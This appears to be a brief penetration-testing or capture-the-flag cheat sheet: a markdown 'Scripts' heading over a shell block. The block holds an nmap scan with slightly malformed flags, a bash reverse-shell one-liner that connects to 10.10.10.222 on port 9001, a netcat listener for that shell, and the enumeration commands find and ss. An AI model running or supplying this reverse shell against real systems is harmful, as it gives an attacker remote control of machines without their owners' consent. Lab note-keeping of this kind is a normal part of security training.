# Scripts

```sh
#/bin/sh
nmap -Sc -sV -reason -oA nmap/makesense <>
bash -c 'bash -i >& /dev/tcp/10.10.10.222/9001 0>&1'
nc -lvnp 9001
find . -type f
ss -lntp
```
